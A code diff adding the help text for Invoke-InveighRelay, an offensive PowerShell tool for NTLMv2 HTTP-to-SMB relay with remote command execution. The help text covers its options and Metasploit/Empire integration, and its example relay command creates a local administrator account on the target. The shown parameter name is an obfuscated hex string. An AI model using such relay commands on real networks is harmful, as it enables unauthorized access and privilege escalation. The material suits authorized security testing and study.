@@ -1,5 +1,99 @@
 ﻿Function Invoke-InveighRelay
 {
+<#
+.SYNOPSIS
+Invoke-InveighRelay performs NTLMv2 HTTP to SMB relay with psexec style command execution.
+
+.DESCRIPTION
+Invoke-InveighRelay currently supports NTLMv2 HTTP to SMB relay with psexec style command execution.
+
+    HTTP/HTTPS to SMB NTLMv2 relay with granular control
+    NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS
+    Granular control of console and file output
+    Can be executed as either a standalone function or through Invoke-Inveigh
+
+.PARAMETER HTTP
+Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.
+
+.PARAMETER HTTPS
+Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
+the local store and attached to port 443. If the script does not exit gracefully, execute
+"netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal"
+in the cert store.
+
+.PARAMETER HTTPSCertAppID
+Specify a valid application GUID for use with the ceriticate.
+
+.PARAMETER HTTPSCertThumbprint
+Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be located in
+the current working directory and named Inveigh.pfx.
+
+.PARAMETER Challenge
+Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a
+random challenge will be generated for each request. Note that during SMB relay attempts, the challenge will be
+pulled from the SMB relay target. 
+
+.PARAMETER MachineAccounts
+Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.
+
+.PARAMETER WPADAuth
+Default = NTLM: (Anonymous,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests. Setting
+to Anonymous can prevent browser login prompts.
+
+.PARAMETER SMBRelayTarget
+IP address of system to target for SMB relay.
+
+.PARAMETER SMBRelayCommand
+Command to execute on SMB relay target. Use PowerShell character escapes where necessary.
+
+.PARAMETER SMBRelayUsernames
+Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
+domain\username format. 
+
+.PARAMETER SMBRelayAutoDisable
+Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.
+
+.PARAMETER SMBRelayNetworkTimeout
+Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay
+target after each packet is sent.
+
+.PARAMETER ConsoleOutput
+Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
+ensure that it doesn't hang the shell.
+
+.PARAMETER FileOutput
+Default = Disabled: (Y/N) Enable/Disable real time file output.
+
+.PARAMETER StatusOutput
+Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
+
+.PARAMETER OutputStreamOnly
+Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if
+running Inveigh Relay through a shell that does not return other output streams. Note that you will not see the
+various yellow warning messages if enabled.
+
+.PARAMETER OutputDir
+Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must
+also be enabled.
+
+.PARAMETER RunTime
+(Integer) Set the run time duration in minutes.
+
+.PARAMETER ShowHelp
+Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
+
+.PARAMETER Tool
+Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's
+Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  
+
+.EXAMPLE
+Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Spring2016 /add && net localgroup administrators Dave /add"
+Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay
+target.
+
+.LINK
+https://github.com/Kevin-Robertson/Inveigh
+#>
 param
 ( 
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${c020fd7010d54ca7a39f33b641e8d7e7}="Y",
